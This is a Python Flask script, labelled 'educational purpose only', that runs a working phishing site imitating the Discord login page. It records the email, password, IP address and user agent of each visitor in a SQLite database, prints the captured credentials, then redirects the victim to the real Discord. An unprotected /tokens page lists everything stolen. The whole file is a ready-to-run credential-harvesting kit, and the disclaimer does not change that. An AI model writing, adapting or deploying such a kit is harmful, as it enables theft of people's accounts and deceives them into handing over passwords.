#!/usr/bin/env python3
"""
⚠️ EDUCATIONAL PURPOSE ONLY - Testing on own infrastructure
"""

import os, json, sqlite3, secrets, requests
from flask import Flask, request, render_template_string, redirect
from flask_cors import CORS
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
CORS(app)

# Database for captured data
conn = sqlite3.connect('tokens.db', check_same_thread=False)
c = conn.cursor()
c.execute("""
    CREATE TABLE IF NOT EXISTS captured (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        token TEXT,
        ip TEXT,
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
""")
conn.commit()

@app.route('/')
def index():
    """Fake Discord login page"""
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Discord Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Arial, sans-serif;
                background: #313338;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                background: #1e1f22;
                padding: 40px;
                border-radius: 8px;
                width: 420px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            }
            .logo { 
                text-align: center; 
                font-size: 28px; 
                color: white;
                margin-bottom: 20px;
                font-weight: bold;
            }
            .logo span { color: #5865F2; }
            .input-group {
                margin-bottom: 15px;
            }
            .input-group label {
                color: #b5bac1;
                font-size: 12px;
                font-weight: 600;
                display: block;
                margin-bottom: 5px;
            }
            .input-group input {
                width: 100%;
                padding: 10px;
                background: #1e1f22;
                border: 1px solid #2b2d31;
                border-radius: 4px;
                color: white;
                font-size: 16px;
            }
            .input-group input:focus {
                border-color: #5865F2;
                outline: none;
            }
            .btn {
                width: 100%;
                padding: 12px;
                background: #5865F2;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
            }
            .btn:hover { background: #4752c4; }
            .error { 
                color: #f23f3f; 
                text-align: center; 
                margin-top: 10px;
                font-size: 14px;
            }
            .footer {
                text-align: center;
                color: #4e5058;
                font-size: 12px;
                margin-top: 20px;
            }
            .footer a { color: #5865F2; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">🗡️ <span>Discord</span></div>
            <form method="POST" action="/login">
                <div class="input-group">
                    <label>EMAIL OR PHONE NUMBER</label>
                    <input type="text" name="email" required>
                </div>
                <div class="input-group">
                    <label>PASSWORD</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn">Login</button>
            </form>
            <div class="footer">
                Need an account? <a href="#">Register</a>
            </div>
        </div>
        <div style="position:fixed;bottom:10px;right:10px;color:#4e5058;font-size:11px;">
            ⚠️ Educational Purpose Only
        </div>
    </body>
    </html>
    """)

@app.route('/login', methods=['POST'])
def login():
    """Capture credentials"""
    email = request.form.get('email')
    password = request.form.get('password')
    
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    
    # Save to database
    c.execute(
        "INSERT INTO captured (email, password, ip, user_agent) VALUES (?, ?, ?, ?)",
        (email, password, ip, ua)
    )
    conn.commit()
    
    print(f"🎯 CAPTURED: {email} | {password}")
    
    # Redirect to real Discord
    return redirect('https://discord.com/login')

@app.route('/tokens')
def view_tokens():
    """View captured tokens (Superadmin only)"""
    data = c.execute("SELECT * FROM captured ORDER BY id DESC LIMIT 50").fetchall()
    html = "<h1>Captured Tokens</h1><table border='1'>"
    html += "<tr><th>ID</th><th>Email</th><th>Password</th><th>IP</th><th>Time</th></tr>"
    for row in data:
        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[5]}</td></tr>"
    html += "</table>"
    return html

if __name__ == "__main__":
    print("🚀 Token Grabber Running on port 8080")
    print("📊 View captured: http://localhost:8080/tokens")
    app.run(host='0.0.0.0', port=8080)
